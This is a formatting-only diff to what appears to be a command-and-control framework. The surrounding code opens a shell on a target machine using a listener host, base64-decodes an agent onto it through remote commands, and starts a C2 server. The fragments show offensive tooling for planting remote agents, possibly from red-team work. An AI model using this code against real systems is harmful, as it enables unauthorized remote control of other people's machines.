@@ -79,6 +79,8 @@ def _sync_credentials_file(user: str, password: str) -> None:
         os.chmod(_CREDENTIALS_FILE, 0o600)
     except OSError as exc:
         log.warning("Could not sync .c2_credentials.txt: %s", exc)
+
+
 _HTTP_TIMEOUT = 20
 _DEPLOY_TIMEOUT = 60
 
@@ -600,11 +602,7 @@ def deploy(
         pass
     spec = open_shell(target, lhost=lhost, privilege=wanted)
     if spec is None:
-        reason = (
-            "no root-capable shell primitive"
-            if is_root
-            else "no working shell primitive"
-        )
+        reason = "no root-capable shell primitive" if is_root else "no working shell primitive"
         return {"deployed": False, "reason": reason, "client_id": client_id}
     import base64 as _b64
 
@@ -616,7 +614,7 @@ def deploy(
     try:
         stage_out = remote_exec(spec, target, f"mktemp -d {_STAGE_DIR_TEMPLATE}", lhost=lhost)
         stage_dir = (stage_out or "").strip().splitlines()[-1].strip() if (stage_out or "").strip() else ""
-        suffix = stage_dir[len(_STAGE_DIR_PREFIX):] if stage_dir.startswith(_STAGE_DIR_PREFIX) else ""
+        suffix = stage_dir[len(_STAGE_DIR_PREFIX) :] if stage_dir.startswith(_STAGE_DIR_PREFIX) else ""
         if not suffix.isalnum():
             return {
                 "deployed": False,
@@ -631,8 +629,7 @@ def deploy(
         verify = remote_exec(
             spec,
             target,
-            f"base64 -d {b64_path} > {agent_path} && rm -f {b64_path}"
-            f" && wc -c < {agent_path} && head -1 {agent_path}",
+            f"base64 -d {b64_path} > {agent_path} && rm -f {b64_path} && wc -c < {agent_path} && head -1 {agent_path}",
             lhost=lhost,
         )
         size_ok = str(len(agent.encode())) in (verify or "")
@@ -781,8 +778,7 @@ class C2Server:
         while time.time() < deadline:
             code = proc.poll()
             if code is not None:
-                return {"started": False,
-                        "reason": f"process exited code={code}, see sessions/c2_server.log"}
+                return {"started": False, "reason": f"process exited code={code}, see sessions/c2_server.log"}
             if self.status().get("https_up") or self.status().get("http_up"):
                 try:
                     _ensure_key()
